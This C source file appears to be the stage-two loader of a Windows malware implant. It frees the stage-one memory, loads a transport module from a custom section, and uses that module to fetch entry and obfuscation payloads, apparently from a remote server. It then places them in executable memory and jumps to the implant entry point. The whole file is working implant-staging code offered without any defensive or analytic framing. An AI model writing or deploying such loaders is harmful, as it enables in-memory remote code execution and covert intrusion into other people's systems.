#include <windows.h>
#include "includes/tcg.h"

char __TRANSPORTMODULE__[0] __attribute__((section("transport_module")));

char * findTransportModule() {
	return (char *)&__TRANSPORTMODULE__;
}

#define WIN32_FUNC( x ) __typeof__( x ) * x

typedef struct {
	WIN32_FUNC(LoadLibraryA);
	WIN32_FUNC(GetProcAddress);
	WIN32_FUNC(VirtualAlloc);
	WIN32_FUNC(VirtualFree);
} WIN32FUNCS;

/*
 * Get the start address of our PIC DLL loader.
 */
void go();

char * getStart() {
	return (char *)go;
}

char * AllocateAndLoadPICO(WIN32FUNCS * funcs, char * srcPico, char * dstCode) {
	/* allocate memory for our PICO data */
	char * dstData = VirtualAlloc( NULL, PicoDataSize(srcPico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );

	/* load our pico into our destination address, thanks! */
	PicoLoad((IMPORTFUNCS *)funcs, srcPico, dstCode, dstData);

	/* get our entry point */
	return (char *)PicoEntryPoint(srcPico, dstCode);
}

typedef char * (*TRANSPORT_MODULE) (char * path);
typedef void   (*IMPLANT_ENTRY)    (char * stage2ptr, char * implantBase, int implantSize, char * transportModule, char * obfuscationModule);

void go(char * stage1ptr) {
	/* let's free our Stage 1 too */
	VirtualFree(stage1ptr, 0, MEM_RELEASE);

	WIN32FUNCS   funcs;

	/* resolve the functions we'll need */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;
	funcs.VirtualAlloc   = VirtualAlloc;
	funcs.VirtualFree    = VirtualFree;

	char * dstTransportCode = VirtualAlloc( NULL, PicoCodeSize(findTransportModule()), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
	char * transportModule  = AllocateAndLoadPICO(&funcs, findTransportModule(), dstTransportCode);

	char * entryPICO       = ((TRANSPORT_MODULE) transportModule) ("/entry.bin");
	char * obfuscationPICO = ((TRANSPORT_MODULE) transportModule) ("/obfuscation.bin");

	VirtualFree(dstTransportCode, 0, MEM_RELEASE);

	int totalSize = 100; /* padding */
	int implantEntrySize      = PicoCodeSize(entryPICO);
	int transportModuleSize   = PicoCodeSize(findTransportModule());
	int obfuscationModuleSize = PicoCodeSize(obfuscationPICO);
	
	totalSize += implantEntrySize;
	totalSize += transportModuleSize;
	totalSize += obfuscationModuleSize;

	char * dstCode = VirtualAlloc( NULL, totalSize, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
	char * originalDstCode = dstCode; /* save original dstCode pointer */

	char * implantEntry      = AllocateAndLoadPICO(&funcs, entryPICO, dstCode);
	dstCode += implantEntrySize + 10; /* small padding */
	
	transportModule = AllocateAndLoadPICO(&funcs, findTransportModule(), dstCode);
	dstCode += transportModuleSize + 10; /* small padding */
	
	char * obfuscationModule = AllocateAndLoadPICO(&funcs, obfuscationPICO, dstCode);

	((IMPLANT_ENTRY) implantEntry) (getStart(), originalDstCode, totalSize, transportModule, obfuscationModule);
}